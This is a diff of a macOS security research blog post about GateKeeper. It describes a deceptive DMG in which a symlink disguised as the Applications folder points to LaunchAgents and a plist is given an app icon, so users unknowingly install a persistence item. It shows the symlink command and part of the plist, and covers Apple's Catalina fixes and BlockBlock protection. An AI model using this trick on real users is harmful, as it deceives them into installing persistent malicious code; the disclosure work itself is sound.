 <p>After many trials it seems that auto-dropping a file to the LaunchAgents folder doesn’t work, or at lest I didn’t find a way. What if we trick the user to place the file there for us? Now, I think average Mac users won’t have a knowledge necessary to do it for us, so we need to provide a convenient and misleading way of doing that. The most obvious location I thought of is the ‘Drag &amp; Drop’ look of mounted DMG file. I mean this (taken from the GNS3 2.1.17 DMG file):</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.12.04.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.12.04.png" alt=""></p>
 <p>What if we replace the app on the left with a plist file, and the link on the right pointing to LaunchAgents.</p>
-
 <p>Replacing the link on the right is easy, just make this:</p>
-
 <pre><code>ln -s ~/Library/LaunchAgents/ Applications
-</code></pre>
-
-<p>It will look exactly the same as the real link above. This means that you can easily fake any link pointing anywhere, while the user will think that it actually points to the Applications folder.</p>
-
+</code></pre><p>It will look exactly the same as the real link above. This means that you can easily fake any link pointing anywhere, while the user will think that it actually points to the Applications folder.</p>
 <p>Replacing the one at the left is also easy. Put there the plist file, and on the “Get Info” pane replace its icon with D&amp;D a new image on the top left corner of the info pane, here:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.19.41.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.19.41.png" alt=""></p>
 <p>Finally we get this:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.17.45.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.17.45.png" alt=""></p>
 <p>If we tick the option “Hide Extension” on the Info pane and if Finder doesn’t have the “Show all filename extensions” setting enabled, we will actually see this:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.18.01.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.18.01.png" alt=""></p>
 <p>Does it look legit? For me for sure it is! :) Now if you drag and drop the gecko from the left to the right, you actually drop the PLIST into the user’s LaunchDaemon’s folder. I’m not sure that the average user will notice that something went wrong, other than not being able to execute the application, and won’t see it.</p>
-
 <p>However upon next reboot the command embedded in the plist file, will be executed. My example plist file is:</p>
 <div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
@@ -469,50 +402,31 @@ mac:Downloads csaby$ cat test.cpio
 	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>StartCalendarInterval<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
 	<span style="color:#309;font-weight:bold">&lt;dict/&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span></code></pre></div>
-<p>The command in the plist file will be executed by <code>launchctl</code> regardless the quarantine flag set.</p>
-
+<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</code></pre></div><p>The command in the plist file will be executed by <code>launchctl</code> regardless the quarantine flag set.</p>
 <p>Two useful resources if you want to build such DMG files:</p>
-
 <p><a href="https://el-tramo.be/blog/fancy-dmg/">Building Fancy DMG Images on Mac OS X</a>
 <a href="https://github.com/andreyvit/create-dmg">GitHub - andreyvit/create-dmg: A shell script to build fancy DMGs</a></p>
-
 <h3 id="protection">Protection</h3>
-
 <p>That’s easy, using Objective-See’s BlockBlock tool will alert us every time a new file is added to the Launch* folders, and will allow us blocking it. It can be downloaded from here:</p>
-
 <p><a href="https://objective-see.com/products/blockblock.html">Objective-See</a></p>
-
 <h2 id="changes-in-macos-catalina">Changes in macOS Catalina</h2>
-
 <p>macOS Catalina introduced number of changes regarding GateKeeper. If you are interested, watch Apple’s talk from WWDC 2019:
 <a href="https://developer.apple.com/videos/play/wwdc2019/701">Advances in macOS Security - WWDC 2019 - Videos - Apple Developer</a>
 Here I will only highlight the main item involving GateKeeper. The most significant change is that GK will also verify applications, binaries when they are run from the command line, via classic ‘exec’ methods. This means that my previous experiments won’t really work anymore. Awesome! Interestingly Apple said that my previous report inspired them to implement this, and they mentioned me in their security advisory of Catalina:</p>
-
-<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-10-18%20at%2011.08.08.png" alt="" /></p>
-
+<p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-10-18%20at%2011.08.08.png" alt=""></p>
 <p>I, by no means want to suggest that I discovered this bypass, as you saw that it was well documented, however likely it was only me who raised this as an issue to Apple.</p>
-
 <p>The other protection they implemented was related my drag &amp; drop trick. They modified <code>Finder</code>  to disallow D&amp;D into the user&rsquo;s LaucnAgents folder.
-<img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-10-18%20at%2011.18.31.png" alt="" /></p>
-
+<img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-10-18%20at%2011.18.31.png" alt=""></p>
 <p>IMO they should disallow the loading of PLIST files that has the quarantine flag present. Someone might find another way to drop there PLIST files, and in that case we are back to ground 0.</p>
-
-<h3 id="changes-in-macos-catalina-10-15-2-security-update">Changes in macOS Catalina 10.15.2 security update</h3>
-
+<h3 id="changes-in-macos-catalina-10152-security-update">Changes in macOS Catalina 10.15.2 security update</h3>
 <p>Above I mentioned that Finder doesn’t allow anymore to D&amp;D into the user’s LaunchAgent’s directory. This is true, however there was a glitch. If you kept the file above the symlink, Finder eventually popped up the folder location, something Apple called a SpringBoard popup, and you could drop the file there. So although you couldn’t place the file on top of the link, if you waited a second or two, the location showed up, and nothing prevented you from D&amp;D the file to its location. I made a video showing this behaviour on Catalina beta:</p>
-
-<p><center><video style="max-width: 100%; border: 1px solid #e5e5e5; border-radius: 4px;" controls="" src="https://theevilbit.github.io/videos/GateKeeper_Bypass_or_not_bypass/catalina-gatekeeper-bypass.mov"></video></center></p>
-
+<!-- raw HTML omitted -->
 <p>Apple fixed this in their 10.15.2 update, the location no longer pops up.</p>
-
 <h3 id="malware-using-qemu-vm-to-run-code-on-macos">Malware using Qemu VM to run code on macOS</h3>
-
 <p>This is not related to my research in any way, however I found it pretty awesome trick to bypass GK. A malware was using Qemu, which is signed to run a custom VM, which will do crypto mining. A VM won’t allow you to access files on the machine, however you can still use the CPU power. Pretty clever :) Here is the full article:
 <a href="https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/">New Mac cryptominer Malwarebytes detects as Bird Miner runs by emulating Linux - Malwarebytes Labs | Malwarebytes Labs</a></p>
-
 <h2 id="conclusion">Conclusion</h2>
-
 <p>I think GateKeeper is a good feature in macOS and although it’s not perfect, it keeps evolving, locking down the ability to run malicious / unsigned code less and less. I hope this post gave you some ideas and it clarified a bit when GK is invoked by the OS.</p>
 
       </div>
